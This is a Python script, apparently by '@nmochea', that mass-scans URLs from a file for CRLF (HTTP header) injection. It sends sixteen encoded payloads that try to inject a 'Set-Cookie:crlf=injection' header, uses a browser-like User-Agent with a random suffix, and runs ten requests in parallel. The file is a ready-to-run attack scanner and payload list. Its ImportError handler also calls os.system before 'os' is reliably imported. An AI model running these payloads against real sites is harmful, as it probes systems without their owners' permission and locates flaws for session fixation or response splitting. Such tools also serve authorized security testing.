
try:
    import argparse
    import concurrent.futures
    import os
    import random
    import requests
    import sys
    import time
except ImportError:
    os.system("pip3 install requests")


payloads = [
    "0%%0a0aSet-Cookie:crlf=injection",
    "%0aSet-Cookie:crlf=injection",
    "%0d%0aSet-Cookie:crlf=injection",
    "%0dSet-Cookie:crlf=injection",
    "%23%0aSet-Cookie:crlf=injection",
    "%23%0d%0aSet-Cookie:crlf=injection",
    "%23%0dSet-Cookie:crlf=injection",
    "%25%30%61Set-Cookie:crlf=injection",
    "%25%30aSet-Cookie:crlf=injection",
    "%250aSet-Cookie:crlf=injection",
    "%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
    "%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
    "%2F..%0d%0aSet-Cookie:crlf=injection",
    "%3f%0d%0aSet-Cookie:crlf=injection",
    "%3f%0dSet-Cookie:crlf=injection",
    "%u000aSet-Cookie:crlf=injection"
]

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" + str(random.randint(0, 99999)),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip",
    "Connection": "close",
}

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-file", help="file containing URLs to scan")
    args = parser.parse_args()
    if not args.file:
        parser.error("Please specify a file containing URLs to scan with the -file option")

    try:
        os.system("clear")
        print("   __   __        ___ ")
        print("  /  ` |__) |    |__  ")
        print("  \__, |  \ |___ |    ")
        print("   @nmochea         \n")
        with open(args.file, "r") as file:
            urls = file.read().splitlines()

        if len(urls) == 0:
            print("No URLs found in the file")
            sys.exit(1)

        if len(urls) > 1:
            print(f"Starting scan for {len(urls)} URLs...\n")

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            for url in urls:
                for payload in payloads:
                    full_url = f"{url}/{payload}"
                    executor.submit(scan_url, full_url, url, payload)

    except FileNotFoundError:
        print(f"File {args.file} not found")
        sys.exit(1)

def scan_url(full_url, url, payload):
    try:
        response = requests.get(full_url, headers=headers, timeout=15, allow_redirects=False)
        if "Set-Cookie" in response.headers and "crlf=injection" in response.headers["Set-Cookie"]:
            print(f"[CRLF] {url}/{payload}")
    except Exception:
        pass

if __name__ == "__main__":
    start_time = time.time()
    main()
    print(f"\nElapsed time: {time.time() - start_time:.2f} seconds")
